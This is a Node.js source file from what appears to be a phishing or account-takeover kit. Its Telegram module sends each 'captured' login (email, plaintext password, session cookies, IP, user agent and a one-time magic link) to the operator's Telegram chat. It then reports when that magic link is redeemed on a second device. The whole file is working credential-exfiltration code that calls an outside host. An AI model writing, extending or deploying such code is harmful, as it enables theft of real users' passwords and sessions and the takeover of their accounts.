// server/telegram.js
const config = require("./config");
const logger = require("./logger");

const { BOT_TOKEN, CHAT_ID } = config.TELEGRAM;

/**
 * Send a Markdown message to the configured Telegram chat.
 * Retries once on network failure.
 */
async function send(text, attempt = 1) {
  try {
    const params = new URLSearchParams({ chat_id: CHAT_ID, text, parse_mode: "Markdown" });
    const res    = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?${params}`,
      { method: "GET", signal: AbortSignal.timeout(8000) }
    );
    const data = await res.json();
    if (!data.ok) {
      logger.error("Telegram API error", { description: data.description });
      // Retry once on rate-limit (429)
      if (data.error_code === 429 && attempt === 1) {
        const wait = (data.parameters?.retry_after || 3) * 1000;
        await new Promise(r => setTimeout(r, wait));
        return send(text, 2);
      }
    } else {
      logger.debug("Telegram message sent");
    }
  } catch (err) {
    logger.error("Telegram network error", { message: err.message });
    if (attempt === 1) {
      await new Promise(r => setTimeout(r, 2000));
      return send(text, 2);
    }
  }
}

const ts = () => new Date().toLocaleString("en-US", { timeZone: "UTC", hour12: false }) + " UTC";

// ── Login captured on Device A ────────────────────────────────────────────────
async function notifyLogin({ email, password, ip, ua, cookies, magicLink, expiresIn }) {
  return send([
    "🔐 *Device A — Login Captured*",
    "━━━━━━━━━━━━━━━━━━━━",
    `📧 *Email:*    \`${email}\``,
    `🔑 *Password:* \`${password}\``,
    `🍪 *Cookies:*  \`${(cookies || "none").slice(0, 300)}\``,
    "",
    "📡 *Device A*",
    `🖥 IP:  \`${ip}\``,
    `🌐 UA:  \`${ua.slice(0, 120)}\``,
    "",
    `🔗 *Magic Link* _(one-time · expires in ${expiresIn})_`,
    `\`${magicLink}\``,
    "",
    "━━━━━━━━━━━━━━━━━━━━",
    `🕐 ${ts()}`,
  ].join("\n"));
}

// ── Token redeemed on Device B ────────────────────────────────────────────────
async function notifyRedeem({ email, ip, ua, token }) {
  return send([
    "✅ *Device B — Magic Link Redeemed*",
    "━━━━━━━━━━━━━━━━━━━━",
    `📧 *Email:* \`${email}\``,
    `🔑 *Token:* \`${token.slice(0, 16)}…\``,
    "",
    "📡 *Device B*",
    `🖥 IP:  \`${ip}\``,
    `🌐 UA:  \`${ua.slice(0, 120)}\``,
    "",
    "⚠️ Token *permanently invalidated*.",
    "━━━━━━━━━━━━━━━━━━━━",
    `🕐 ${ts()}`,
  ].join("\n"));
}

// ── Redemption failed ─────────────────────────────────────────────────────────
async function notifyFail({ token, reason, ip, ua }) {
  return send([
    "❌ *Magic Link Failed*",
    "━━━━━━━━━━━━━━━━━━━━",
    `🔑 Token:  \`${token.slice(0, 16)}…\``,
    `💥 Reason: \`${reason}\``,
    `🖥 IP:     \`${ip}\``,
    `🌐 UA:     \`${ua.slice(0, 80)}\``,
    `🕐 ${ts()}`,
  ].join("\n"));
}

module.exports = { notifyLogin, notifyRedeem, notifyFail };
